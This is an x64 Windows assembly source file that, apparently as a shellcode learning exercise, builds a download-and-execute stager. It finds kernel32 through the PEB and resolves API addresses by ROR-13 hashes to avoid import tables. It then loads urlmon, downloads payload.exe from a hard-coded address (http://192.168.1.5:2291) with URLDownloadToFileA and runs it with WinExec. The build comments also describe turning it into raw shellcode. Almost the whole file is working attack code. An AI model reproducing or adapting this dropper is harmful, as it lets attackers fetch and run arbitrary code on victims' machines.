;; dedkuzmich
;;
;; Compile executable:
;; $ nasm -f win64 exp.asm -o exp.obj && gcc exp.obj -o exp.exe && ./exp.exe
;;
;; Compile shellcode:
;; $ nasm -f bin sc.asm -o sc.obj && python patcher.py && ./outnew.exe
;;
;; Format:  https://github.com/dedkuzmich/nasmfmt_operands_indent
;; $ nasmfmt -oi 12 exp.asm

        bits        64
        default     rel                        ; RIP-relative addressing (without this, section .data will be ignored)

        extern      puts
        extern      strlen
        extern      _ui64toa
        extern      system
        extern      strcmp

        extern      GetStdHandle
        extern      WriteFile
        extern      ExitProcess

        global      WinMain


;; Save and restore volatile (preserved) registers excluding rsp, rbp
        %macro      save_regs 0
        push        rbx
        push        rsi
        push        rdi
        push        r12
        push        r13
        push        r14
        push        r15
        %endmacro  

        %macro      restore_regs 0
        pop         r15
        pop         r14
        pop         r13
        pop         r12
        pop         rdi
        pop         rsi
        pop         rbx
        %endmacro  


;; Align %$localsize to 16 bytes and enter
        %macro      align_enter 1
        %assign     %%size %1
        %assign     %%module %%size % 16
        %if         %%module != 0              ; Make %%size a multiple of 16
        %assign     %%diff 16 - %%module
        %assign     %%size %%size + %%diff
        %endif     
        enter       (%%size + 8), 0            ; Add 8 to compensate "%push proc_context"
        %endmacro  


        %define     utf16(x) __?utf16?__(x)    ; UTF-16 macros



        section     .data
        ; DEFAULT
STD_OUTPUT_HANDLE:
        dq          -11

endl:
        db          10, 0

szPause:
        db          "pause", 0


        ; KERNEL32.DLL
szKernel32:
        db          "kernel32.dll", 0

szWinExec:
        db          "WinExec", 0

szLoadLibraryA:
        db          "LoadLibraryA", 0

szGetProcAddress:
        db          "GetProcAddress", 0


        ; URLMON.DLL
szUrlmon:
        db          "urlmon.dll", 0

szURLDownloadToFileA:
        db          "URLDownloadToFileA", 0


        ; STRINGS
szCalc:
        db          "calc.exe", 0

szUrl:
        db          "http://192.168.1.5:2291/payload.exe", 0

szPayload:
        db          "payload.exe", 0



        section     .bss
szBuffer1:
        resb        24



        section     .text
;; void WinMain()
WinMain:
        save_regs  
        %push       proc_context
        %stacksize  flat64
        %assign     %$localsize 64

        ; KERNEL32.DLL
        %local      hKernel32:qword
        %local      pLoadLibraryA:qword
        %local      pGetProcAddress:qword
        %local      pWinExec:qword

        ; URLMON.DLL
        %local      hUrlmon:qword
        %local      pURLDownloadToFileA:qword


        ; OTHER VARS
        %local      iNum1:qword
        align_enter %$localsize


        ; LoadLibraryA
        lea         rcx, [szLoadLibraryA]
        call        GetKernel32ProcAddress
        mov         qword [pLoadLibraryA], rax
        ; GetProcAddress
        lea         rcx, [szGetProcAddress]
        call        GetKernel32ProcAddress
        mov         qword [pGetProcAddress], rax


        ; KERNEL32.DLL
        lea         rcx, [szKernel32]
        call        qword [pLoadLibraryA]
        mov         qword [hKernel32], rax
        ; WinExec
        mov         rcx, qword [hKernel32]
        lea         rdx, [szWinExec]
        call        qword [pGetProcAddress]
        mov         qword [pWinExec], rax


        ; URLMON.DLL
        lea         rcx, [szUrlmon]
        call        qword [pLoadLibraryA]
        mov         qword [hUrlmon], rax
        ; URLDownloadToFileA
        mov         rcx, qword [hUrlmon]
        lea         rdx, [szURLDownloadToFileA]
        call        qword [pGetProcAddress]
        mov         qword [pURLDownloadToFileA], rax


        ; CODE
        mov         rcx, [pWinExec]
        mov         rdx, 16
        call        PrintNum

        mov         rcx, [pURLDownloadToFileA]
        mov         rdx, 16
        call        PrintNum

        ; Download payload
        mov         rcx, 0
        lea         rdx, [szUrl]
        lea         r8, [szPayload]
        mov         r9, 0
        mov         qword [rsp+32], 0
        call        qword [pURLDownloadToFileA]

        ; Run payload
        lea         rcx, [szPayload]
        mov         rdx, 5
        call        qword [pWinExec]


        leave      
        restore_regs
        ret        
        %pop       



;; int GetKernel32ProcAddress (PSTR pProcName)
;; pProcName = rcx
GetKernel32ProcAddress:
        save_regs  
        %push       proc_context
        %stacksize  flat64
        %assign     %$localsize 64
        %local      pProcName:qword
        %local      iProcName:qword
        %local      pKernel32:qword

        %local      iBase:qword
        %local      cNames:qword
        %local      pFunctions:qword
        %local      pNames:qword
        %local      pNameOrdinals:qword

        %local      pName:qword
        %local      idxName:qword
        %local      iOrdinal:qword
        %local      pFunction:qword
        align_enter %$localsize

        mov         qword [pProcName], rcx

        ; Hash function name
        mov         rcx, qword [pProcName]
        call        Ror13
        mov         qword [iProcName], rax


        ; Find kernel32.dll base address
        mov         rbx, [gs:0x60]             ; PEB
        mov         rbx, [rbx + 0x18]          ; LDR
        mov         rbx, [rbx + 0x20]          ; InMemoryOrderModuleList (1st entry)
        mov         rbx, [rbx]                 ; 2 ntdll.dll
        mov         rbx, [rbx]                 ; 3 kernel32.dll
        mov         rbx, [rbx + 0x20]          ; InInitializationOrderLinks (1st entry)
        mov         qword [pKernel32], rbx     ; kernel32.dll base address


        ; Get info from kernel32.dll export directory
        mov         r12, qword [pKernel32]     ; kernel32.dll base (DOS header)
        mov         ebx, [r12 + 0x3c]          ; NT header offset
        add         rbx, r12                   ; NT header
        mov         ebx, [rbx + 0x18 + 0x70]   ; Export Directory RVA
        add         rbx, r12                   ; Export Directory

        mov         rcx, 0
        mov         ecx, [rbx + 0x10]          ; Base (ordinals of functions start from this number)
        mov         qword [iBase], rcx

        mov         ecx, [rbx + 0x14]          ; NumberOfNames
        mov         qword [cNames], rcx

        mov         ecx, [rbx + 0x1c]          ; AddressOfFunctions RVA
        add         rcx, r12                   ; AddressOfFunctions
        mov         qword [pFunctions], rcx

        mov         ecx, [rbx + 0x20]          ; AddressOfNames RVA
        add         rcx, r12                   ; AddressOfNames
        mov         qword [pNames], rcx

        mov         ecx, [rbx + 0x24]          ; AddressOfNameOrdinals RVA
        add         rcx, r12                   ; AddressOfNameOrdinals
        mov         qword [pNameOrdinals], rcx


        ; Find name index
        mov         r15, 0                     ; Counter
.nextName:
        mov         r12, qword [pNames]
        mov         ebx, [r12 + 4 * r15]       ; Name RVA
        add         rbx, qword [pKernel32]     ; Name
        mov         qword [pName], rbx
        mov         qword [idxName], r15

        mov         rcx, qword [pName]         ; Hash current name
        call        Ror13
        cmp         rax, qword [iProcName]     ; Compare ROR-13 hash with already known value
        je          .endLoop

        inc         r15
        cmp         r15, qword [cNames]        ; Max num of iterations = NumberOfNames
        jne         .nextName
.endLoop:

        ; Find ordinal
        mov         rax, 0
        mov         r12, qword [pNameOrdinals]
        mov         r15, qword [idxName]
        mov         ax, [r12 + 2 * r15]        ; Ordinal = Name index + Base
        add         rax, qword [iBase]         ; Base is a value of the 1st ordinal (it can be 1, 2, ... N)
        mov         qword [iOrdinal], rax


        ; Find address
        mov         rax, 0
        mov         r12, qword [pFunctions]
        mov         r15, qword [iOrdinal]
        sub         r15, qword [iBase]
        mov         eax, [r12 + 4 * r15]       ; Function RVA
        add         rax, qword [pKernel32]     ; Function
        mov         qword [pFunction], rax

        mov         rax, qword [pFunction]     ; Return function address

        leave      
        restore_regs
        ret        
        %pop       



;; void PrintNum (int iNum, int Radix)
;; iNum = rcx
;; iRadix = rdx
PrintNum:
        save_regs  
        %push       proc_context
        %stacksize  flat64
        %assign     %$localsize 64
        %local      iNum:qword
        %local      iRadix:qword               ; Base [2, 10, 16]
        %local      szNum:byte[24]
        align_enter %$localsize

        mov         rsi, 0
        mov         rdi, 0
        mov         qword [iNum], rcx
        mov         qword [iRadix], rdx

        ; Convert int to string
        mov         rcx, qword [iNum]
        lea         rdx, [szNum]
        mov         r8, qword [iRadix]
        call        _ui64toa

        ; Print string
        lea         rcx, [szNum]
        call        PrintStr
        lea         rcx, [endl]
        call        PrintStr

        leave      
        restore_regs
        ret        
        %pop       



;; void PrintStr (PSTR pStr)
;; pStr = rcx
PrintStr:
        save_regs  
        %push       proc_context
        %stacksize  flat64
        %assign     %$localsize 64             ; Shadow space (32) + space for stack args (32)
        %local      pStr:qword                 ; Pointer to string
        %local      cbStr:qword                ; Length of string
        %local      cbWritten:qword
        %local      hStdOut:qword
        align_enter %$localsize

        ; Set rsi, rdi to 0 for iterators correct work
        mov         rsi, 0
        mov         rdi, 0

        ; Save argument(s) as local var(s)
        mov         qword [pStr], rcx

        ; Get length of string
        mov         rcx, qword [pStr]
        call        strlen
        mov         qword [cbStr], rax

        ; Get handle to StdOut
        mov         rcx, [STD_OUTPUT_HANDLE]
        call        GetStdHandle
        mov         qword [hStdOut], rax

        ; Write string to StdOut
        mov         rcx, qword [hStdOut]
        mov         rdx, qword [pStr]
        mov         r8, qword [cbStr]
        lea         r9, [cbWritten]
        mov         qword [rsp+32], 0          ; 5th arg. 6th arg should be passed with [rsp+40]
        call        WriteFile

        leave      
        restore_regs
        ret        
        %pop       


;; int Ror13 (PSTR pStr)
;; pStr = rcx
;; ROR-13 online:   https://asecuritysite.com/hash/ror13_2
Ror13:
        save_regs  
        %push       proc_context
        %stacksize  flat64
        %assign     %$localsize 64
        %local      pStr:qword
        align_enter %$localsize

        mov         qword [pStr], rcx

        ; Hash loop
        mov         r11, qword [pStr]
        mov         r12, 0                     ; Hash
        mov         r15, 0                     ; Counter
.nextByte:
        mov         rbx, 0
        mov         bl, [r11 + 1 * r15]        ; Read a byte from string
        cmp         rbx, 0                     ; Check if current byte = 0
        je          .endLoop

        ror         r12d, 13                   ; Use r12 to have qword hash, r12d - dword hash
        add         r12, rbx
        inc         r15
        jmp         .nextByte
.endLoop:
        mov         rax, r12                   ; Return hash

        leave      
        restore_regs
        ret        
        %pop       
